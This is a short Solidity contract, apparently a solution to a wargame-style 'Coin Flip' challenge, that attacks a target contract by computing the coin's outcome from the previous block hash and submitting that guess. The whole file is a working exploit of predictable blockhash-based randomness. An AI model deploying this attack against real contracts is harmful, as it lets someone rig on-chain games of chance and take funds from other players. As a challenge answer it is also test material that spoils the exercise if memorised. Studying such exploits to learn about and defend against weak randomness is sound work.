// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public target;

    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    uint256 private lastHash;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        require(blockValue != lastHash, "same block hash");

        lastHash = blockValue;
        bool side = (blockValue / FACTOR) == 1;

        target.flip(side);
    }
}
